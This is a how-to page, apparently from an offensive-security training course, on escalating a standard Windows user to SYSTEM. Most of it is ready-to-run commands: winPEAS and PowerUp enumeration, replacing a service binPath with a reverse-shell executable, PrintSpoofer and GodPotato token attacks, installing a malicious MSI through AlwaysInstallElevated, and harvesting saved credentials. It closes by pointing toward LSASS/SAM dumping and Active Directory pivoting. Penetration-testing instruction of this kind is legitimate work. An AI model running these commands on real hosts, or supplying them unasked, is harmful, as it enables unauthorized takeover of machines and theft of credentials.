---
title: Escalate to SYSTEM on Windows
slug: windows-privesc
area: windows
module: 8
order: 4
goal: Go from a standard user to local admin / SYSTEM on a Windows host.
summary: How to escalate on Windows — enumerate with winPEAS/PowerUp, then abuse service misconfigs, token privileges (potato attacks), AlwaysInstallElevated and unquoted paths.
prereqs: [A shell as a non-admin Windows user, winPEAS or PowerUp to enumerate, A way to drop a small exe/dll if needed]
seeAlso: [tool:peass, tool:windows-privesc, tool:lolbins, howto:attack-lsass, map:windows]
references:
  - HackTricks: Windows local privilege escalation | https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html
  - PayloadsAllTheThings: Windows privesc | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
---

Windows privesc is a checklist of misconfigurations — enumerate thoroughly, then work the hits. The quickest wins are weak service permissions and token privileges.

## Enumerate first

```cmd
whoami /priv & whoami /groups
.\winPEASx64.exe
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
```

## Service misconfigurations

```cmd
:: unquoted path with a writable gap, or a service binary/path you can replace
.\accesschk64.exe -uwcqv "Users" *            :: writable services
sc config VulnSvc binPath= "C:\temp\rev.exe" & sc start VulnSvc
reg query HKLM\...\Services\VulnSvc           :: inspect ImagePath
```

## Token privileges (potato attacks)

`SeImpersonatePrivilege` (common on service accounts/IIS/MSSQL) → SYSTEM.

```cmd
whoami /priv | findstr /i impersonate
.\PrintSpoofer.exe -i -c cmd         :: or GodPotato / JuicyPotatoNG
.\GodPotato.exe -cmd "cmd /c whoami"
```

## AlwaysInstallElevated

```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i evil.msi       :: both = 1 -> MSI runs as SYSTEM
```

## If it fails

- **winPEAS shows nothing obvious**: check saved credentials (`cmdkey /list`, registry autologon, unattend.xml), scheduled tasks, and installed software CVEs.
- **No SeImpersonate**: look for `SeBackup`/`SeRestore` (read the SAM), `SeDebug`, or a vulnerable service instead.
- **Potato fails on newer Windows**: use GodPotato / JuicyPotatoNG rather than the original JuicyPotato.
- **Can't write the service binary**: you may still be able to change `binPath` itself if you have SERVICE_CHANGE_CONFIG.

## Verify

```cmd
whoami            :: nt authority\system
```

Now dump credentials (LSASS, SAM) and, in a domain, pivot toward Active Directory.
